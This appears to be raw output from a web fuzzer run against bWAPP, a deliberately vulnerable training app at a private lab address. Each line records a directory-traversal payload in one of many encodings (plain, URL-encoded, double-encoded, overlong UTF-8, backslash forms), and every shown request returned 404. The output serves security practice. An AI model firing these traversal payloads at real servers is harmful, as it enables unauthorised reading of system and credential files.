156,404,9L,39W,http://10.0.2.4/bWAPP//%25c0%25ae%25c0%25ae%25c0%25af%25c0%25ae%25c0%25ae%25c0%25af%25c0%25ae%25c0%25ae%25c0%25af%25c0%25ae%25c0%25ae%25c0%25af%25c0%25ae%25c0%25ae%25c0%25af{FILE}
157,404,9L,39W,http://10.0.2.4/bWAPP//%25c0%25ae%25c0%25ae%25c0%25af%25c0%25ae%25c0%25ae%25c0%25af%25c0%25ae%25c0%25ae%25c0%25af%25c0%25ae%25c0%25ae%25c0%25af%25c0%25ae%25c0%25ae%25c0%25af%25c0%25ae%25c0%25ae%25c0%25af{FILE}
158,404,9L,39W,http://10.0.2.4/bWAPP//%25c0%25ae%25c0%25ae%25c0%25af%25c0%25ae%25c0%25ae%25c0%25af%25c0%25ae%25c0%25ae%25c0%25af%25c0%25ae%25c0%25ae%25c0%25af%25c0%25ae%25c0%25ae%25c0%25af%25c0%25ae%25c0%25ae%25c0%25af%25c0%25ae%25c0%25ae%25c0%25af{FILE}
160,404,9L,39W,http://10.0.2.4/bWAPP//..%c1%9c{FILE}
159,404,9L,39W,http://10.0.2.4/bWAPP//%25c0%25ae%25c0%25ae%25c0%25af%25c0%25ae%25c0%25ae%25c0%25af%25c0%25ae%25c0%25ae%25c0%25af%25c0%25ae%25c0%25ae%25c0%25af%25c0%25ae%25c0%25ae%25c0%25af%25c0%25ae%25c0%25ae%25c0%25af%25c0%25ae%25c0%25ae%25c0%25af%25c0%25ae%25c0%25ae%25c0%25af{FILE}
161,404,9L,39W,http://10.0.2.4/bWAPP//..%c1%9c..%c1%9c{FILE}
166,404,9L,39W,http://10.0.2.4/bWAPP//..%c1%9c..%c1%9c..%c1%9c..%c1%9c..%c1%9c..%c1%9c..%c1%9c{FILE}
162,404,9L,39W,http://10.0.2.4/bWAPP//..%c1%9c..%c1%9c..%c1%9c{FILE}
165,404,9L,39W,http://10.0.2.4/bWAPP//..%c1%9c..%c1%9c..%c1%9c..%c1%9c..%c1%9c..%c1%9c{FILE}
164,404,9L,39W,http://10.0.2.4/bWAPP//..%c1%9c..%c1%9c..%c1%9c..%c1%9c..%c1%9c{FILE}
163,404,9L,39W,http://10.0.2.4/bWAPP//..%c1%9c..%c1%9c..%c1%9c..%c1%9c{FILE}
167,404,9L,39W,http://10.0.2.4/bWAPP//..%c1%9c..%c1%9c..%c1%9c..%c1%9c..%c1%9c..%c1%9c..%c1%9c..%c1%9c{FILE}
169,404,9L,39W,http://10.0.2.4/bWAPP//%c0%ae%c0%ae\%c0%ae%c0%ae\{FILE}
170,404,9L,39W,http://10.0.2.4/bWAPP//%c0%ae%c0%ae\%c0%ae%c0%ae\%c0%ae%c0%ae\{FILE}
168,404,9L,39W,http://10.0.2.4/bWAPP//%c0%ae%c0%ae\{FILE}
173,404,9L,39W,http://10.0.2.4/bWAPP//%c0%ae%c0%ae\%c0%ae%c0%ae\%c0%ae%c0%ae\%c0%ae%c0%ae\%c0%ae%c0%ae\%c0%ae%c0%ae\{FILE}
171,404,9L,39W,http://10.0.2.4/bWAPP//%c0%ae%c0%ae\%c0%ae%c0%ae\%c0%ae%c0%ae\%c0%ae%c0%ae\{FILE}
175,404,9L,39W,http://10.0.2.4/bWAPP//%c0%ae%c0%ae\%c0%ae%c0%ae\%c0%ae%c0%ae\%c0%ae%c0%ae\%c0%ae%c0%ae\%c0%ae%c0%ae\%c0%ae%c0%ae\%c0%ae%c0%ae\{FILE}
172,404,9L,39W,http://10.0.2.4/bWAPP//%c0%ae%c0%ae\%c0%ae%c0%ae\%c0%ae%c0%ae\%c0%ae%c0%ae\%c0%ae%c0%ae\{FILE}
174,404,9L,39W,http://10.0.2.4/bWAPP//%c0%ae%c0%ae\%c0%ae%c0%ae\%c0%ae%c0%ae\%c0%ae%c0%ae\%c0%ae%c0%ae\%c0%ae%c0%ae\%c0%ae%c0%ae\{FILE}
176,404,9L,39W,http://10.0.2.4/bWAPP//%c0%ae%c0%ae%c1%9c{FILE}
177,404,9L,39W,http://10.0.2.4/bWAPP//%c0%ae%c0%ae%c1%9c%c0%ae%c0%ae%c1%9c{FILE}
179,404,9L,39W,http://10.0.2.4/bWAPP//%c0%ae%c0%ae%c1%9c%c0%ae%c0%ae%c1%9c%c0%ae%c0%ae%c1%9c%c0%ae%c0%ae%c1%9c{FILE}
180,404,9L,39W,http://10.0.2.4/bWAPP//%c0%ae%c0%ae%c1%9c%c0%ae%c0%ae%c1%9c%c0%ae%c0%ae%c1%9c%c0%ae%c0%ae%c1%9c%c0%ae%c0%ae%c1%9c{FILE}
178,404,9L,39W,http://10.0.2.4/bWAPP//%c0%ae%c0%ae%c1%9c%c0%ae%c0%ae%c1%9c%c0%ae%c0%ae%c1%9c{FILE}
181,404,9L,39W,http://10.0.2.4/bWAPP//%c0%ae%c0%ae%c1%9c%c0%ae%c0%ae%c1%9c%c0%ae%c0%ae%c1%9c%c0%ae%c0%ae%c1%9c%c0%ae%c0%ae%c1%9c%c0%ae%c0%ae%c1%9c{FILE}
182,404,9L,39W,http://10.0.2.4/bWAPP//%c0%ae%c0%ae%c1%9c%c0%ae%c0%ae%c1%9c%c0%ae%c0%ae%c1%9c%c0%ae%c0%ae%c1%9c%c0%ae%c0%ae%c1%9c%c0%ae%c0%ae%c1%9c%c0%ae%c0%ae%c1%9c{FILE}
183,404,9L,39W,http://10.0.2.4/bWAPP//%c0%ae%c0%ae%c1%9c%c0%ae%c0%ae%c1%9c%c0%ae%c0%ae%c1%9c%c0%ae%c0%ae%c1%9c%c0%ae%c0%ae%c1%9c%c0%ae%c0%ae%c1%9c%c0%ae%c0%ae%c1%9c%c0%ae%c0%ae%c1%9c{FILE}
185,404,9L,39W,http://10.0.2.4/bWAPP//..%25c1%259c..%25c1%259c{FILE}
184,404,9L,39W,http://10.0.2.4/bWAPP//..%25c1%259c{FILE}
186,404,9L,39W,http://10.0.2.4/bWAPP//..%25c1%259c..%25c1%259c..%25c1%259c{FILE}
187,404,9L,39W,http://10.0.2.4/bWAPP//..%25c1%259c..%25c1%259c..%25c1%259c..%25c1%259c{FILE}
189,404,9L,39W,http://10.0.2.4/bWAPP//..%25c1%259c..%25c1%259c..%25c1%259c..%25c1%259c..%25c1%259c..%25c1%259c{FILE}
188,404,9L,39W,http://10.0.2.4/bWAPP//..%25c1%259c..%25c1%259c..%25c1%259c..%25c1%259c..%25c1%259c{FILE}
190,404,9L,39W,http://10.0.2.4/bWAPP//..%25c1%259c..%25c1%259c..%25c1%259c..%25c1%259c..%25c1%259c..%25c1%259c..%25c1%259c{FILE}
192,404,9L,39W,http://10.0.2.4/bWAPP//%25c0%25ae%25c0%25ae\{FILE}
193,404,9L,39W,http://10.0.2.4/bWAPP//%25c0%25ae%25c0%25ae\%25c0%25ae%25c0%25ae\{FILE}
194,404,9L,39W,http://10.0.2.4/bWAPP//%25c0%25ae%25c0%25ae\%25c0%25ae%25c0%25ae\%25c0%25ae%25c0%25ae\{FILE}
191,404,9L,39W,http://10.0.2.4/bWAPP//..%25c1%259c..%25c1%259c..%25c1%259c..%25c1%259c..%25c1%259c..%25c1%259c..%25c1%259c..%25c1%259c{FILE}
195,404,9L,39W,http://10.0.2.4/bWAPP//%25c0%25ae%25c0%25ae\%25c0%25ae%25c0%25ae\%25c0%25ae%25c0%25ae\%25c0%25ae%25c0%25ae\{FILE}
197,404,9L,39W,http://10.0.2.4/bWAPP//%25c0%25ae%25c0%25ae\%25c0%25ae%25c0%25ae\%25c0%25ae%25c0%25ae\%25c0%25ae%25c0%25ae\%25c0%25ae%25c0%25ae\%25c0%25ae%25c0%25ae\{FILE}
196,404,9L,39W,http://10.0.2.4/bWAPP//%25c0%25ae%25c0%25ae\%25c0%25ae%25c0%25ae\%25c0%25ae%25c0%25ae\%25c0%25ae%25c0%25ae\%25c0%25ae%25c0%25ae\{FILE}
199,404,9L,39W,http://10.0.2.4/bWAPP//%25c0%25ae%25c0%25ae\%25c0%25ae%25c0%25ae\%25c0%25ae%25c0%25ae\%25c0%25ae%25c0%25ae\%25c0%25ae%25c0%25ae\%25c0%25ae%25c0%25ae\%25c0%25ae%25c0%25ae\%25c0%25ae%25c0%25ae\{FILE}
198,404,9L,39W,http://10.0.2.4/bWAPP//%25c0%25ae%25c0%25ae\%25c0%25ae%25c0%25ae\%25c0%25ae%25c0%25ae\%25c0%25ae%25c0%25ae\%25c0%25ae%25c0%25ae\%25c0%25ae%25c0%25ae\%25c0%25ae%25c0%25ae\{FILE}
201,404,9L,39W,http://10.0.2.4/bWAPP//%25c0%25ae%25c0%25ae%25c1%259c%25c0%25ae%25c0%25ae%25c1%259c{FILE}
200,404,9L,39W,http://10.0.2.4/bWAPP//%25c0%25ae%25c0%25ae%25c1%259c{FILE}
203,404,9L,39W,http://10.0.2.4/bWAPP//%25c0%25ae%25c0%25ae%25c1%259c%25c0%25ae%25c0%25ae%25c1%259c%25c0%25ae%25c0%25ae%25c1%259c%25c0%25ae%25c0%25ae%25c1%259c{FILE}
202,404,9L,39W,http://10.0.2.4/bWAPP//%25c0%25ae%25c0%25ae%25c1%259c%25c0%25ae%25c0%25ae%25c1%259c%25c0%25ae%25c0%25ae%25c1%259c{FILE}
205,404,9L,39W,http://10.0.2.4/bWAPP//%25c0%25ae%25c0%25ae%25c1%259c%25c0%25ae%25c0%25ae%25c1%259c%25c0%25ae%25c0%25ae%25c1%259c%25c0%25ae%25c0%25ae%25c1%259c%25c0%25ae%25c0%25ae%25c1%259c%25c0%25ae%25c0%25ae%25c1%259c{FILE}
204,404,9L,39W,http://10.0.2.4/bWAPP//%25c0%25ae%25c0%25ae%25c1%259c%25c0%25ae%25c0%25ae%25c1%259c%25c0%25ae%25c0%25ae%25c1%259c%25c0%25ae%25c0%25ae%25c1%259c%25c0%25ae%25c0%25ae%25c1%259c{FILE}
207,404,9L,39W,http://10.0.2.4/bWAPP//%25c0%25ae%25c0%25ae%25c1%259c%25c0%25ae%25c0%25ae%25c1%259c%25c0%25ae%25c0%25ae%25c1%259c%25c0%25ae%25c0%25ae%25c1%259c%25c0%25ae%25c0%25ae%25c1%259c%25c0%25ae%25c0%25ae%25c1%259c%25c0%25ae%25c0%25ae%25c1%259c%25c0%25ae%25c0%25ae%25c1%259c{FILE}
206,404,9L,39W,http://10.0.2.4/bWAPP//%25c0%25ae%25c0%25ae%25c1%259c%25c0%25ae%25c0%25ae%25c1%259c%25c0%25ae%25c0%25ae%25c1%259c%25c0%25ae%25c0%25ae%25c1%259c%25c0%25ae%25c0%25ae%25c1%259c%25c0%25ae%25c0%25ae%25c1%259c%25c0%25ae%25c0%25ae%25c1%259c{FILE}
257,404,9L,39W,http://10.0.2.4/bWAPP//../../{FILE}
256,404,9L,39W,http://10.0.2.4/bWAPP//../{FILE}
265,404,9L,39W,http://10.0.2.4/bWAPP//..%2f..%2f{FILE}
264,404,9L,39W,http://10.0.2.4/bWAPP//..%2f{FILE}
266,404,9L,39W,http://10.0.2.4/bWAPP//..%2f..%2f..%2f{FILE}
268,404,9L,39W,http://10.0.2.4/bWAPP//..%2f..%2f..%2f..%2f..%2f{FILE}
267,404,9L,39W,http://10.0.2.4/bWAPP//..%2f..%2f..%2f..%2f{FILE}
269,404,9L,39W,http://10.0.2.4/bWAPP//..%2f..%2f..%2f..%2f..%2f..%2f{FILE}
270,404,9L,39W,http://10.0.2.4/bWAPP//..%2f..%2f..%2f..%2f..%2f..%2f..%2f{FILE}
271,404,9L,39W,http://10.0.2.4/bWAPP//..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f{FILE}
273,404,9L,39W,http://10.0.2.4/bWAPP//%2e%2e/%2e%2e/{FILE}
287,404,9L,39W,http://10.0.2.4/bWAPP//%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f{FILE}
288,404,9L,39W,http://10.0.2.4/bWAPP//..%252f{FILE}
281,404,9L,39W,http://10.0.2.4/bWAPP//%2e%2e%2f%2e%2e%2f{FILE}
286,404,9L,39W,http://10.0.2.4/bWAPP//%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f{FILE}
285,404,9L,39W,http://10.0.2.4/bWAPP//%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f{FILE}
280,404,9L,39W,http://10.0.2.4/bWAPP//%2e%2e%2f{FILE}
292,404,9L,39W,http://10.0.2.4/bWAPP//..%252f..%252f..%252f..%252f..%252f{FILE}
289,404,9L,39W,http://10.0.2.4/bWAPP//..%252f..%252f{FILE}
293,404,9L,39W,http://10.0.2.4/bWAPP//..%252f..%252f..%252f..%252f..%252f..%252f{FILE}
299,404,9L,39W,http://10.0.2.4/bWAPP//%252e%252e/%252e%252e/%252e%252e/%252e%252e/{FILE}
290,404,9L,39W,http://10.0.2.4/bWAPP//..%252f..%252f..%252f{FILE}
291,404,9L,39W,http://10.0.2.4/bWAPP//..%252f..%252f..%252f..%252f{FILE}
300,404,9L,39W,http://10.0.2.4/bWAPP//%252e%252e/%252e%252e/%252e%252e/%252e%252e/%252e%252e/{FILE}
298,404,9L,39W,http://10.0.2.4/bWAPP//%252e%252e/%252e%252e/%252e%252e/{FILE}
297,404,9L,39W,http://10.0.2.4/bWAPP//%252e%252e/%252e%252e/{FILE}
295,404,9L,39W,http://10.0.2.4/bWAPP//..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f{FILE}
296,404,9L,39W,http://10.0.2.4/bWAPP//%252e%252e/{FILE}
301,404,9L,39W,http://10.0.2.4/bWAPP//%252e%252e/%252e%252e/%252e%252e/%252e%252e/%252e%252e/%252e%252e/{FILE}
303,404,9L,39W,http://10.0.2.4/bWAPP//%252e%252e/%252e%252e/%252e%252e/%252e%252e/%252e%252e/%252e%252e/%252e%252e/%252e%252e/{FILE}
302,404,9L,39W,http://10.0.2.4/bWAPP//%252e%252e/%252e%252e/%252e%252e/%252e%252e/%252e%252e/%252e%252e/%252e%252e/{FILE}
282,404,9L,39W,http://10.0.2.4/bWAPP//%2e%2e%2f%2e%2e%2f%2e%2e%2f{FILE}
304,404,9L,39W,http://10.0.2.4/bWAPP//%252e%252e%252f{FILE}
272,404,9L,39W,http://10.0.2.4/bWAPP//%2e%2e/{FILE}
305,404,9L,39W,http://10.0.2.4/bWAPP//%252e%252e%252f%252e%252e%252f{FILE}
307,404,9L,39W,http://10.0.2.4/bWAPP//%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f{FILE}
306,404,9L,39W,http://10.0.2.4/bWAPP//%252e%252e%252f%252e%252e%252f%252e%252e%252f{FILE}
308,404,9L,39W,http://10.0.2.4/bWAPP//%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f{FILE}
312,404,9L,39W,http://10.0.2.4/bWAPP//..\{FILE}
310,404,9L,39W,http://10.0.2.4/bWAPP//%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f{FILE}
311,404,9L,39W,http://10.0.2.4/bWAPP//%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f{FILE}
313,404,9L,39W,http://10.0.2.4/bWAPP//..\..\{FILE}
314,404,9L,39W,http://10.0.2.4/bWAPP//..\..\..\{FILE}
284,404,9L,39W,http://10.0.2.4/bWAPP//%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f{FILE}
316,404,9L,39W,http://10.0.2.4/bWAPP//..\..\..\..\..\{FILE}
318,404,9L,39W,http://10.0.2.4/bWAPP//..\..\..\..\..\..\..\{FILE}
283,404,9L,39W,http://10.0.2.4/bWAPP//%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f{FILE}
319,404,9L,39W,http://10.0.2.4/bWAPP//..\..\..\..\..\..\..\..\{FILE}
317,404,9L,39W,http://10.0.2.4/bWAPP//..\..\..\..\..\..\{FILE}
320,404,9L,39W,http://10.0.2.4/bWAPP//..%5c{FILE}
321,404,9L,39W,http://10.0.2.4/bWAPP//..%5c..%5c{FILE}
322,404,9L,39W,http://10.0.2.4/bWAPP//..%5c..%5c..%5c{FILE}
323,404,9L,39W,http://10.0.2.4/bWAPP//..%5c..%5c..%5c..%5c{FILE}
324,404,9L,39W,http://10.0.2.4/bWAPP//..%5c..%5c..%5c..%5c..%5c{FILE}
325,404,9L,39W,http://10.0.2.4/bWAPP//..%5c..%5c..%5c..%5c..%5c..%5c{FILE}
326,404,9L,39W,http://10.0.2.4/bWAPP//..%5c..%5c..%5c..%5c..%5c..%5c..%5c{FILE}
294,404,9L,39W,http://10.0.2.4/bWAPP//..%252f..%252f..%252f..%252f..%252f..%252f..%252f{FILE}
327,404,9L,39W,http://10.0.2.4/bWAPP//..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c{FILE}
328,404,9L,39W,http://10.0.2.4/bWAPP//%2e%2e\{FILE}
315,404,9L,39W,http://10.0.2.4/bWAPP//..\..\..\..\{FILE}
309,404,9L,39W,http://10.0.2.4/bWAPP//%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f{FILE}
329,404,9L,39W,http://10.0.2.4/bWAPP//%2e%2e\%2e%2e\{FILE}
330,404,9L,39W,http://10.0.2.4/bWAPP//%2e%2e\%2e%2e\%2e%2e\{FILE}
331,404,9L,39W,http://10.0.2.4/bWAPP//%2e%2e\%2e%2e\%2e%2e\%2e%2e\{FILE}
332,404,9L,39W,http://10.0.2.4/bWAPP//%2e%2e\%2e%2e\%2e%2e\%2e%2e\%2e%2e\{FILE}
333,404,9L,39W,http://10.0.2.4/bWAPP//%2e%2e\%2e%2e\%2e%2e\%2e%2e\%2e%2e\%2e%2e\{FILE}
335,404,9L,39W,http://10.0.2.4/bWAPP//%2e%2e\%2e%2e\%2e%2e\%2e%2e\%2e%2e\%2e%2e\%2e%2e\%2e%2e\{FILE}
334,404,9L,39W,http://10.0.2.4/bWAPP//%2e%2e\%2e%2e\%2e%2e\%2e%2e\%2e%2e\%2e%2e\%2e%2e\{FILE}
336,404,9L,39W,http://10.0.2.4/bWAPP//%2e%2e%5c{FILE}
339,404,9L,39W,http://10.0.2.4/bWAPP//%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c{FILE}
337,404,9L,39W,http://10.0.2.4/bWAPP//%2e%2e%5c%2e%2e%5c{FILE}
340,404,9L,39W,http://10.0.2.4/bWAPP//%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c{FILE}
338,404,9L,39W,http://10.0.2.4/bWAPP//%2e%2e%5c%2e%2e%5c%2e%2e%5c{FILE}
341,404,9L,39W,http://10.0.2.4/bWAPP//%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c{FILE}
344,404,9L,39W,http://10.0.2.4/bWAPP//..%255c{FILE}
343,404,9L,39W,http://10.0.2.4/bWAPP//%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c{FILE}
345,404,9L,39W,http://10.0.2.4/bWAPP//..%255c..%255c{FILE}
342,404,9L,39W,http://10.0.2.4/bWAPP//%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c{FILE}
346,404,9L,39W,http://10.0.2.4/bWAPP//..%255c..%255c..%255c{FILE}
349,404,9L,39W,http://10.0.2.4/bWAPP//..%255c..%255c..%255c..%255c..%255c..%255c{FILE}
348,404,9L,39W,http://10.0.2.4/bWAPP//..%255c..%255c..%255c..%255c..%255c{FILE}
350,404,9L,39W,http://10.0.2.4/bWAPP//..%255c..%255c..%255c..%255c..%255c..%255c..%255c{FILE}
347,404,9L,39W,http://10.0.2.4/bWAPP//..%255c..%255c..%255c..%255c{FILE}
351,404,9L,39W,http://10.0.2.4/bWAPP//..%255c..%255c..%255c..%255c..%255c..%255c..%255c..%255c{FILE}
353,404,9L,39W,http://10.0.2.4/bWAPP//%252e%252e\%252e%252e\{FILE}
354,404,9L,39W,http://10.0.2.4/bWAPP//%252e%252e\%252e%252e\%252e%252e\{FILE}
355,404,9L,39W,http://10.0.2.4/bWAPP//%252e%252e\%252e%252e\%252e%252e\%252e%252e\{FILE}
352,404,9L,39W,http://10.0.2.4/bWAPP//%252e%252e\{FILE}
357,404,9L,39W,http://10.0.2.4/bWAPP//%252e%252e\%252e%252e\%252e%252e\%252e%252e\%252e%252e\%252e%252e\{FILE}
356,404,9L,39W,http://10.0.2.4/bWAPP//%252e%252e\%252e%252e\%252e%252e\%252e%252e\%252e%252e\{FILE}
360,404,9L,39W,http://10.0.2.4/bWAPP//%252e%252e%255c{FILE}
358,404,9L,39W,http://10.0.2.4/bWAPP//%252e%252e\%252e%252e\%252e%252e\%252e%252e\%252e%252e\%252e%252e\%252e%252e\{FILE}
359,404,9L,39W,http://10.0.2.4/bWAPP//%252e%252e\%252e%252e\%252e%252e\%252e%252e\%252e%252e\%252e%252e\%252e%252e\%252e%252e\{FILE}
365,404,9L,39W,http://10.0.2.4/bWAPP//%252e%252e%255c%252e%252e%255c%252e%252e%255c%252e%252e%255c%252e%252e%255c%252e%252e%255c{FILE}
361,404,9L,39W,http://10.0.2.4/bWAPP//%252e%252e%255c%252e%252e%255c{FILE}
366,404,9L,39W,http://10.0.2.4/bWAPP//%252e%252e%255c%252e%252e%255c%252e%252e%255c%252e%252e%255c%252e%252e%255c%252e%252e%255c%252e%252e%255c{FILE}
363,404,9L,39W,http://10.0.2.4/bWAPP//%252e%252e%255c%252e%252e%255c%252e%252e%255c%252e%252e%255c{FILE}
362,404,9L,39W,http://10.0.2.4/bWAPP//%252e%252e%255c%252e%252e%255c%252e%252e%255c{FILE}
364,404,9L,39W,http://10.0.2.4/bWAPP//%252e%252e%255c%252e%252e%255c%252e%252e%255c%252e%252e%255c%252e%252e%255c{FILE}
369,404,9L,39W,http://10.0.2.4/bWAPP//../../{FILE}
367,404,9L,39W,http://10.0.2.4/bWAPP//%252e%252e%255c%252e%252e%255c%252e%252e%255c%252e%252e%255c%252e%252e%255c%252e%252e%255c%252e%252e%255c%252e%252e%255c{FILE}
377,404,9L,39W,http://10.0.2.4/bWAPP//..%2f..%2f{FILE}
376,404,9L,39W,http://10.0.2.4/bWAPP//..%2f{FILE}
368,404,9L,39W,http://10.0.2.4/bWAPP//../{FILE}
380,404,9L,39W,http://10.0.2.4/bWAPP//..%2f..%2f..%2f..%2f..%2f{FILE}
378,404,9L,39W,http://10.0.2.4/bWAPP//..%2f..%2f..%2f{FILE}
379,404,9L,39W,http://10.0.2.4/bWAPP//..%2f..%2f..%2f..%2f{FILE}
381,404,9L,39W,http://10.0.2.4/bWAPP//..%2f..%2f..%2f..%2f..%2f..%2f{FILE}
382,404,9L,39W,http://10.0.2.4/bWAPP//..%2f..%2f..%2f..%2f..%2f..%2f..%2f{FILE}
384,404,9L,39W,http://10.0.2.4/bWAPP//%2e%2e/{FILE}
385,404,9L,39W,http://10.0.2.4/bWAPP//%2e%2e/%2e%2e/{FILE}
383,404,9L,39W,http://10.0.2.4/bWAPP//..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f{FILE}
393,404,9L,39W,http://10.0.2.4/bWAPP//%2e%2e%2f%2e%2e%2f{FILE}
392,404,9L,39W,http://10.0.2.4/bWAPP//%2e%2e%2f{FILE}
394,404,9L,39W,http://10.0.2.4/bWAPP//%2e%2e%2f%2e%2e%2f%2e%2e%2f{FILE}
395,404,9L,39W,http://10.0.2.4/bWAPP//%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f{FILE}
399,404,9L,39W,http://10.0.2.4/bWAPP//%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f{FILE}
398,404,9L,39W,http://10.0.2.4/bWAPP//%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f{FILE}
396,404,9L,39W,http://10.0.2.4/bWAPP//%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f{FILE}
397,404,9L,39W,http://10.0.2.4/bWAPP//%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f{FILE}
402,404,9L,39W,http://10.0.2.4/bWAPP//..%252f..%252f..%252f{FILE}
401,404,9L,39W,http://10.0.2.4/bWAPP//..%252f..%252f{FILE}
405,404,9L,39W,http://10.0.2.4/bWAPP//..%252f..%252f..%252f..%252f..%252f..%252f{FILE}
408,404,9L,39W,http://10.0.2.4/bWAPP//%252e%252e/{FILE}
407,404,9L,39W,http://10.0.2.4/bWAPP//..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f{FILE}
406,404,9L,39W,http://10.0.2.4/bWAPP//..%252f..%252f..%252f..%252f..%252f..%252f..%252f{FILE}
404,404,9L,39W,http://10.0.2.4/bWAPP//..%252f..%252f..%252f..%252f..%252f{FILE}
410,404,9L,39W,http://10.0.2.4/bWAPP//%252e%252e/%252e%252e/%252e%252e/{FILE}
413,404,9L,39W,http://10.0.2.4/bWAPP//%252e%252e/%252e%252e/%252e%252e/%252e%252e/%252e%252e/%252e%252e/{FILE}
411,404,9L,39W,http://10.0.2.4/bWAPP//%252e%252e/%252e%252e/%252e%252e/%252e%252e/{FILE}
412,404,9L,39W,http://10.0.2.4/bWAPP//%252e%252e/%252e%252e/%252e%252e/%252e%252e/%252e%252e/{FILE}
409,404,9L,39W,http://10.0.2.4/bWAPP//%252e%252e/%252e%252e/{FILE}
400,404,9L,39W,http://10.0.2.4/bWAPP//..%252f{FILE}
417,404,9L,39W,http://10.0.2.4/bWAPP//%252e%252e%252f%252e%252e%252f{FILE}
414,404,9L,39W,http://10.0.2.4/bWAPP//%252e%252e/%252e%252e/%252e%252e/%252e%252e/%252e%252e/%252e%252e/%252e%252e/{FILE}
415,404,9L,39W,http://10.0.2.4/bWAPP//%252e%252e/%252e%252e/%252e%252e/%252e%252e/%252e%252e/%252e%252e/%252e%252e/%252e%252e/{FILE}
403,404,9L,39W,http://10.0.2.4/bWAPP//..%252f..%252f..%252f..%252f{FILE}
420,404,9L,39W,http://10.0.2.4/bWAPP//%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f{FILE}
418,404,9L,39W,http://10.0.2.4/bWAPP//%252e%252e%252f%252e%252e%252f%252e%252e%252f{FILE}
416,404,9L,39W,http://10.0.2.4/bWAPP//%252e%252e%252f{FILE}
419,404,9L,39W,http://10.0.2.4/bWAPP//%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f{FILE}
421,404,9L,39W,http://10.0.2.4/bWAPP//%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f{FILE}
422,404,9L,39W,http://10.0.2.4/bWAPP//%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f{FILE}
424,404,9L,39W,http://10.0.2.4/bWAPP//..\{FILE}
425,404,9L,39W,http://10.0.2.4/bWAPP//..\..\{FILE}
423,404,9L,39W,http://10.0.2.4/bWAPP//%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f{FILE}
